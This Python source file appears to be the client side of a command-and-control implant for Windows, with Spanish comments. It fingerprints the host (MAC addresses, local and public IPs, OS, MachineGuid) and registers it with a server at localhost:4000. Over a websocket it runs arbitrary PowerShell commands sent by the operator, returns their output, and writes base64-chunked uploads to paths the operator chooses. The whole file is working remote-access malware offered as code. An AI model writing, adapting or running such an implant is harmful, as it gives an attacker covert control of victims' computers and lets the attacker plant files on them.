import asyncio
from websockets import connect
from websockets.exceptions import ConnectionClosedError
import json
import subprocess
import signal
import sys
import requests
import os
import base64

GROUP = "grupo1"
current_dir = os.getcwd()

def def_handler(sig, frame):
    print("\n\n[!] Saliendo..\n")	
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def cmo(cmd):
    global current_dir

    cmd = cmd.strip()

    if cmd.startswith("cd "):
        path = cmd[3:].strip().replace('"', '')
        if path == "..":
            current_dir = os.path.dirname(current_dir)
        else:
            new_path = os.path.abspath(os.path.join(current_dir, path))
            if os.path.isdir(new_path):
                current_dir = new_path
            else:
                return "", f"El directorio '{path}' no existe.", current_dir

        return "", "", current_dir

    # Ejecutar el comando en el directorio actual
    escaped_cmd = cmd.replace('"', '"')
    print(escaped_cmd)
    result = subprocess.run(
        ['powershell.exe', '-Command', f'Set-Location "{current_dir}"; {escaped_cmd}'],
        capture_output=True, text=True
    )
    return result.stdout, result.stderr, current_dir

def get_macs():
    macs_output, err, _ = cmo("Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty MacAddress")
    maclist = []
    if macs_output:
        for num in macs_output.splitlines():
            maclist.append(num.replace("\n", "").replace("\r", ""))
        return maclist
    else:
        return ['undefined']

def get_local_ips():
    ips_output, err, _ = cmo("Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } | Select-Object -ExpandProperty IPAddress")
    iplist = []
    if ips_output:
        for ip in ips_output.splitlines():
            iplist.append(ip.replace("\n", "").replace("\r", ""))
        return iplist
    else:
        return ['undefined']

def get_public_ip():
    ip_output, err, _ = cmo('Invoke-RestMethod -Uri "https://api.ipify.org"')
    return ip_output.strip() if ip_output else "undefined"

def get_operating_system():
    sysop, err, _ = cmo('(Get-CimInstance Win32_OperatingSystem).Caption')
    return sysop.strip() if sysop else "undefined"

def impl_id():
    output, _, _ = cmo("(Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -Name MachineGuid).MachineGuid")
    return str(output).replace('\\n', '').strip()

def register():
    maclist = get_macs()
    local_ip = get_local_ips()
    public_ip = get_public_ip().replace("\n","").replace("\r","")
    operating_system = get_operating_system().replace("\n","").replace("\r","")

    model={
        'impl_mac': maclist,
        'group': GROUP,
        'public_ip': public_ip,
        'local_ip': local_ip,
        'operating_system': operating_system,
        'impl_id':impl_id()
    }

    req=requests.post(f"http://localhost:4000/api/impl/new/{model['impl_id']}", data=model)


async def receive():
    register()
    upload_buffer = []
    upload_destination = None   
    try:
        uri = f"ws://localhost:4000/api/rcv?id={impl_id()}"
        async with connect(uri) as ws:
            while True:
                cmd = await ws.recv()
                data = json.loads(cmd.replace("'", '"'))
                if 'cmd' in data:
                    try:
                        out, err, cwd = cmo(data["cmd"])
                        msg = {
                            "result": out if out else err,
                            "cwd": cwd
                        }
                        await ws.send(json.dumps(msg))
                    except Exception as e:
                        await asyncio.sleep(5)
                elif 'chunk' in data:
                    try:
                        part = base64.b64decode(data['chunk']['data'])
                        is_last = data['chunk'].get('last', False)

                        upload_buffer.append(part)

                        if upload_destination is None:
                            upload_destination = data['destination']

                        if is_last:
                            with open(upload_destination, "wb") as f:
                                for chunk in upload_buffer:
                                    f.write(chunk)

                            # Limpieza
                            upload_buffer.clear()
                            upload_destination = None

                    except Exception as e:
                        ws.send("Error al subir archivo: " + str(e))
    except Exception:
        await asyncio.sleep(5)

asyncio.run(receive())
